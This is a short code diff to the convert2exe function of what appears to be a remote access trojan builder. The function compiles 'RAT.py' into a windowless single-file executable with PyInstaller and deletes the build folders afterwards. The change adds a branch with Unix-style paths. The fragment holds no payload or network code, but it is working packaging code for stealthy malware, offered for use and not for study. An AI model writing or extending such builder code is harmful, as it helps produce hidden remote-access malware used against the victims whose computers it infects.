@@ -139,15 +139,26 @@ def convert2exe():
     print(' Converting to EXE...' + Fore.CYAN)
 
     try:
-        check_call(['pyinstaller', '-F', '--workpath=.\\builds\\build', '--distpath=.\\builds\\dist',
+        if os.name == 'nt':
+            check_call(['pyinstaller', '-F', '--workpath=.\\builds\\build', '--distpath=.\\builds\\dist',
                     '--specpath=.\\builds', '--noconsole', '--clean', 'RAT.py'],
                    stdout=DEVNULL, stderr=STDOUT)
-        exe_file = []
-        for i in os.listdir(os.path.join(os.getcwd(), 'builds\\dist')):
-            if i.endswith('.exe'):
-                exe_file.append(i)
-        for j in exe_file:
-            shutil.copy2(os.path.join(os.getcwd(), ('builds\\dist\\' + j)), os.getcwd())
+            exe_file = []
+            for i in os.listdir(os.path.join(os.getcwd(), 'builds\\dist')):
+                if i.endswith('.exe'):
+                    exe_file.append(i)
+            for j in exe_file:
+                shutil.copy2(os.path.join(os.getcwd(), ('builds\\dist\\' + j)), os.getcwd())
+        else:
+            check_call(['pyinstaller', '-F', '--workpath=./builds/build', '--distpath=./builds/dist',
+                        '--specpath=./builds', '--noconsole', '--clean', 'RAT.py'],
+                       stdout=DEVNULL, stderr=STDOUT)
+            exe_file = []
+            for i1 in os.listdir(os.path.join(os.getcwd(), 'builds/dist')):
+                if i1.endswith('.exe'):
+                    exe_file.append(i1)
+            for j1 in exe_file:
+                shutil.copy2(os.path.join(os.getcwd(), ('builds/dist/' + j1)), os.getcwd())
 
         shutil.rmtree(os.path.join(os.getcwd(), '__pycache__'))
         shutil.rmtree(os.path.join(os.getcwd(), 'builds'))
